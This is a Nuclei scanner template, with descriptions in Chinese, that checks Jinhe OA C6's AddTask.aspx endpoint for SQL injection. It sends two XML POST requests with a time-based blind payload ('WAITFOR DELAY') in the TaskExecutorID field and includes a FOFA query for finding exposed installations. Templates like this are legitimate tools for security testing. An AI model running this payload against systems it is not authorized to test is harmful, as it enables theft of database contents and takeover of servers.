id: JinHe-OA-C6-AddTask-SQL

info:
  name: "金和OA C6 AddTask.aspx 接口SQL注入漏洞"
  author: HuanXiong
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
    金和OA C6 AddTask.aspx 接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: 金和OA

http:
  - raw:
      - |
        @timeout: 20s
        POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
        Host: {{Host}}
        Content-type:application/xml

        <root>
         <Page>
          <PageName>TaskDetect</PageName>
         </Page>
         <StartTime>2025-06-06 00:00:00</StartTime>
         <EndTime>2025-06-06 00:00:00</EndTime>
         <TaskExecutorID>3');WAITFOR DELAY'0:0:5'-- </TaskExecutorID>
        </root>

      - |
        @timeout: 20s
        POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
        Host: {{Host}}
        Content-type:application/xml

        <root>
         <Page>
          <PageName>TaskDetect</PageName>
         </Page>
         <StartTime>2025-06-06 00:00:00</StartTime>
         <EndTime>2025-06-06 00:00:00</EndTime>
         <TaskExecutorID>3');WAITFOR DELAY'0:0:8'-- </TaskExecutorID>
        </root>

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code_1==200 && duration_1>=5 && duration_1<=6"
          - "status_code_2==200 && duration_2>=8 && duration_2<=9"
        condition: and
